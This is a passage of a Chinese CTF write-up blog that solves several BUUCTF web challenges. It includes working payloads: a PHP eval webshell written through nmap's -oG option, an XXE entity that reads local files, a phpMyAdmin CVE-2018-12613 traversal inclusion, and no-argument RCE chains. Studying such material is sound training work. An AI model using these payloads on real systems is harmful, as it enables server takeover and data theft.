2.用户不能指定更多的参数一个 3.用户不能执行不同的命令</span><br><span class="line">escapeshellcmd：</span><br><span class="line">escapeshellcmd()是阻止多参数命令执行的，因为一整个传参的内容都被当做一串字符串了。虽然命令语句只能执行一个，但是可以指定不同参数，比如：</span><br><span class="line">$username = &#x27;myuser1 myuser2&#x27;;</span><br><span class="line">system(&#x27;groups &#x27;.$username);</span><br><span class="line">=&gt;</span><br><span class="line">//myuser1 : myuser1 adm cdrom sudo</span><br><span class="line">//myuser2 : myuser2 adm cdrom sudo</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-10"><a href="#解题过程：-10" class="headerlink" title="解题过程："></a>解题过程：</h4><h5 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 检查是否存在HTTP_X_FORWARDED_FOR头部，这通常发生在请求经过代理服务器时。</span><br><span class="line">// 如果存在，则将REMOTE_ADDR（客户端IP）设置为HTTP_X_FORWARDED_FOR的值，以反映代理服务器之前的客户端IP。</span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 判断GET请求中是否包含了&#x27;host&#x27;参数。</span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    // 如果没有&#x27;host&#x27;参数，使用highlight_file()函数高亮显示当前脚本的源代码。</span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 获取GET请求中的&#x27;host&#x27;参数值。</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    </span><br><span class="line">    // 使用escapeshellarg()函数为命令行参数添加引号并转义特殊字符，以防止命令注入。</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    </span><br><span class="line">    // 使用escapeshellcmd()进一步转义命令中的特殊字符，增加安全性。</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    </span><br><span class="line">    // 生成一个基于固定字符串&quot;glzjin&quot;和客户端IP地址的MD5哈希值，作为沙盒目录的名称。</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    </span><br><span class="line">    // 输出用户所在的沙盒环境标识。</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    </span><br><span class="line">    // 尝试创建以$andbox命名的目录，@符号用于抑制mkdir函数可能产生的错误警告。</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    </span><br><span class="line">    // 改变当前工作目录到刚创建的沙盒目录。</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    </span><br><span class="line">    // 执行nmap命令，对$host进行快速端口扫描(-T5表示快速扫描，-sT表示TCP连接扫描，-Pn表示不进行主机存活探测，</span><br><span class="line">    // --host-timeout 2设置超时为2秒，-F表示快速扫描，仅扫描前100个最常用的端口)。</span><br><span class="line">    // 然后输出nmap扫描结果。</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">这里可以进行GET传参，但是由于escapeshellarg($host);escapeshellcmd($host);所有传入的命令都会被加上&#x27;&#x27;,命令也会无效</span><br><span class="line">step2:</span><br><span class="line">注意到nmap,nmap -oG可以写文件，于是想到写木马进去连接后台</span><br><span class="line">payload：</span><br><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;666&quot;]);?&gt; -oG 1.php &#x27;这里注意最后的&#x27;最好是跟前一个字符之间留一个空格，否则转义之后\\就会和前面的1.php连在一起，访问的时候就是1.php\\这个文件。</span><br><span class="line">step3:</span><br><span class="line">http://4b6c2980-a670-4d88-aea5-4c30632ad44f.node5.buuoj.cn:81/68ce73a49650737798e6260a605e9396/1.php</span><br><span class="line">使用蚁剑连接后台查看flag</span><br></pre></td></tr></table></figure>

<h2 id="GIT源码泄露"><a href="#GIT源码泄露" class="headerlink" title="GIT源码泄露"></a>GIT源码泄露</h2><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><h4 id="考点-11"><a href="#考点-11" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.githack</span><br><span class="line">2.无参数RCE</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-11"><a href="#解题过程：-11" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">进入并没有收集到有用信息，扫目录看一下，看到一些git信息，在/.git/COMMIT_EDITMSG看到有index.php和flag.php</span><br><span class="line">step2:</span><br><span class="line">想办法拿到index源码，就用到一个工具，GitHack</span><br><span class="line">python GitHack.py http://fb2a7fff-542e-44fb-81d9-23d9f2e27e13.node5.buuoj.cn:81/.git</span><br><span class="line">下载源码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    //不让用php伪协议</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        // 这段正则尝试匹配并移除所有形如函数名(可选递归)(参数)的结构，如果最终结果仅为分号(&#x27;;&#x27;)，</span><br><span class="line">        // 表明原始输入可能只包含一个或多个函数调用且无其他字符，进入下一步检查。</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            // 排除某些敏感函数或关键词，这些可能被用于获取系统信息或执行进一步的代码操作，</span><br><span class="line">            // 如et(可能指eval)，na(可能指assert)，info(phpinfo)，dec/bin/hex/oct转换，pi/log数学函数等。</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">step3:</span><br><span class="line">无参数RCE于是构造</span><br><span class="line">payload：</span><br><span class="line">?exp=var_dump(scandir(current(localeconv())));</span><br><span class="line">回显：</span><br><span class="line">array(3) &#123; [0]=&gt; string(4) &quot;.git&quot; [1]=&gt; string(8) &quot;flag.php&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125; </span><br><span class="line">我们要读取flag.php,因为flag在倒数第二个位置，所以反转数组，在移动指针到下一个即可</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><h4 id="考点：-5"><a href="#考点：-5" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxe漏洞</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-8"><a href="#知识点：-8" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞原理：</span><br><span class="line">发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</span><br><span class="line">（我们可以通过Entity引入外部实体向外部发起请求，因为可控所以存在漏洞）</span><br><span class="line">（PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体解析，才会存在 XXE 漏洞。）</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-12"><a href="#解题过程：-12" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">打开看到一个登录界面，查看源码我们看到了登录界面的逻辑代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function doLogin()&#123;</span><br><span class="line">	var username = $(&quot;#username&quot;).val();</span><br><span class="line">	var password = $(&quot;#password&quot;).val();</span><br><span class="line">	if(username == &quot;&quot; || password == &quot;&quot;)&#123;</span><br><span class="line">		alert(&quot;Please enter the username and password!&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        url: &quot;doLogin.php&quot;,</span><br><span class="line">        contentType: &quot;application/xml;charset=utf-8&quot;,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: &quot;xml&quot;,</span><br><span class="line">        anysc: false,</span><br><span class="line">        success: function (result) &#123;</span><br><span class="line">        	var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        	var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        	if(code == &quot;0&quot;)&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);</span><br><span class="line">        	&#125;else if(code == &quot;1&quot;)&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);</span><br><span class="line">        	&#125;else&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(&quot;.msg&quot;).text(errorThrown + &#x27;:&#x27; + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">step2:注入点</span><br><span class="line">看到我们在登录界面输入的账号密码会被处理成xml数据在url/doLogin.php页面再去进行验证，于是可以进行xml注入，用POST</span><br><span class="line">构造payload:</span><br><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    (实体admin会被解析器替换为file:///flag,它将尝试读取file:///flag所指向的文件，并将其内容插入到&lt;username&gt;标签的位置。)</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">抓包POST传进去，就可以拿到flag</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><h4 id="考点：-6"><a href="#考点：-6" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-9"><a href="#知识点：-9" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞原理：</span><br><span class="line">phpMyAdmin 是一套开源的、基于Web的MySQL数据库管理工具。在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，其中攻击者可以在服务器上包含文件。该漏洞来自 phpMyAdmin 中重定向和加载页面的部分代码，以及对白名单页面的不当测试。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</span><br><span class="line">漏洞影响：</span><br><span class="line">4.8.0 &lt;= phpMyAdmin &lt; 4.8.2</span><br><span class="line">include $_REQUEST[&#x27;target&#x27;];:</span><br><span class="line">1.任意文件包含: 攻击者可以通过操控$_REQUEST[&#x27;target&#x27;]的值来指定任意文件路径，从而让服务器包含并执行服务器上的任何文件，包括但不限于配置文件、敏感信息文件或系统命令执行脚本。</span><br><span class="line">2.远程文件包含: 如果$_REQUEST[&#x27;target&#x27;]的值被设置为一个URL，include函数还可能尝试从远程服务器包含文件，这可能导致数据泄露或执行远程服务器上的恶意代码。</span><br><span class="line">3.代码注入: 攻击者可能通过这种方式向服务器注入恶意代码，从而获得对服务器的控制权。</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-13"><a href="#解题过程：-13" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">在robots.txt看到phpinfo.php访问看到一些php信息</span><br><span class="line">step2:</span><br><span class="line">扫后台发现：</span><br><span class="line">[10:26:33] 200 -   84KB - /phpinfo.php</span><br><span class="line">[10:27:00] 200 -   20KB - /phpmyadmin/ChangeLog</span><br><span class="line">[10:27:01] 200 -    1KB - /phpmyadmin/README</span><br><span class="line">[10:27:03] 200 -   15KB - /phpmyadmin/doc/html/index.html</span><br><span class="line">[10:27:04] 200 -   75KB - /phpmyadmin/index.php</span><br><span class="line">[10:27:05] 200 -   75KB - /phpmyadmin/</span><br><span class="line">[10:28:37] 200 -   36B  - /robots.txt</span><br><span class="line">访问/phpmyadmin/index.php是一个phpmyadmin界面</span><br><span class="line">step2:</span><br><span class="line">看源代码看到漏洞点：</span><br><span class="line">在index.php里面：</span><br><span class="line">if (! empty($_REQUEST[&#x27;target&#x27;])//target不为空</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])//target是字符串</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])//target不能以index开头</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)//黑名单绕过</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($[&#x27;target&#x27;])//验证过checkPageValidity</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#x27;target&#x27;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">他会对传入的target参数进行验证验证过了就执行 include $_REQUEST[&#x27;target&#x27;];所以在这里可以进行读取任意文件的操作</span><br><span class="line">去看checkPageValidity方法：</span><br><span class="line">    public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist = self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">这里大概就是说满足page参数是字符串并且满足下面三个任意一条就可以返回true,不然就是false</span><br><span class="line">1.直接在$whitelist中。</span><br><span class="line">2.在去除查询字符串后在$whitelist中。</span><br><span class="line">3.在去除查询字符串并解码后在$whitelist中。</span><br><span class="line">step3:</span><br><span class="line">主要是得通过checkPageValidity又得在include $_REQUEST[&#x27;target&#x27;];执行查看文件得操作</span><br><span class="line">payload：?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><h4 id="考点：-7"><a href="#考点：-7" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GitHack</span><br><span class="line">exit不仅可以推出当前脚本，还可以输出</span><br><span class="line">变量覆盖</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-14"><a href="#解题过程：-14" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">扫了后台什么的看到git，猜测可能Git源码泄露，用GitHack跑一下，看了index.php,flag.php,打开index.php：</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">看到exit()可以输出里面的内容而且这里有$$变量覆盖漏洞，所以可以利用exit来输出flag变量的内容</span><br><span class="line">step3:</span><br><span class="line">这里可以有三种解法</span><br><span class="line">1:利用exit($yds)</span><br><span class="line">直接构造yds=flag就行，因为if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))直接不穿就进了</span><br><span class="line">2:利用exit($handsome)</span><br><span class="line">构造?handsome=flag&amp;flag=a&amp;a=b    flag=a&amp;a=b 满足if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)</span><br><span class="line">3:利用exit($is)</span><br><span class="line">/?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>



<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h4 id="考点-12"><a href="#考点-12" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.字符串逃逸</span><br></pre></td></tr></table></figure>

<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">在phpinfo里面我们找到了d0g3_f1ag.php，要读取它</span><br><span class="line">注意到&#x27;img&#x27;变量，要把它值变成d0g3_f1ag.php，他是在$_SESSION类里面的，这有个extract可以覆盖变量的值，但是直接改img的值是不行的，因为在后面的（if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;）里面对img又赋值了，赋值后这两个都不是我们想要的，而且在img这个位置上都不能读取出我们想要的</span><br><span class="line">filter方法，可以把特定的内容替换为空</span><br><span class="line">我们可以用字符串逃逸，把img放到function的位置上，就可以读取我们想要的；</span><br></pre></td></tr></table></figure>

